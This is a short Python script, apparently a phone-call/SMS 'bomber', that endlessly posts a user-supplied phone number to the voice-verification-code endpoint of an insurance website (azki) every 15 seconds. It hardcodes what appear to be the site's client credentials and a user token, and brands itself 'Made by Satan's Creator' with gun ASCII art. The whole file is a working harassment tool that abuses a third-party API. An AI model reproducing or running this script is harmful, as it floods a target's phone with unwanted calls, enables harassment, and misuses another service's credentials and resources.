import requests
import time
import datetime
import os
from colorama import Fore, init

def send_verification_code(phone_number):
    url = "https://www.azki.co/api/vehicleorder/v2/app/auth/register-vocal-verify-code"

    headers = {
        'accept': 'application/json',
        'accept-encoding': 'gzip, deflate, br',
        'accept-language': 'en-US,en;q=0.9',
        'authorization': 'Basic QmltaXRvQ2xpZW50OkJpbWl0b1NlY3JldA==',
        'device': 'web',
        'deviceid': '6',
        'password': 'BimitoSecret',
        'origin': 'https://www.azki.com',
        'referer': 'https://www.azki.com/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0',
        'user-token': 'Gs0pn0o8sfSW1OYPjxAUKBPNjeT6FwYyrgE5OMnRP6eI4AzTAjIoPXV18YqIEZUN',
        'username': 'BimitoClient'
    }

    while True:
        data = {"phoneNumber": phone_number}
        response = requests.post(url=url, json=data, headers=headers)
        if response.status_code == 200:
            print(Fore.GREEN + "Done\n∧__∧\n( ･ω･)\n(っ▄︻▇〓▄︻┻┳═一\n/ )ﾊﾞﾊﾞﾊﾞﾊﾞ\n( /￣∪")
        else:
            print(Fore.RED + "Failed\n∧__∧\n( ･ω･)\n(っ▄︻▇〓▄︻┻┳═一\n/ )ﾊﾞﾊﾊﾊﾞ\n( /￣∪")
        time.sleep(15)

# Initialize colorama
init()

print(Fore.GREEN + "Made by Satan's Creator\n∧__∧\n( ･ω･)\n(っ▄︻▇〓▄︻┻┳═一\n/ )ﾊﾞﾊﾞﾊﾞﾊﾞ\n( /￣∪)")

if __name__ == "__main__":
    time.sleep(2)
    os.system("clear")
    number = input("Enter the phone number: ")
    current_time = datetime.datetime.now()
    print(current_time)
    send_verification_code(number)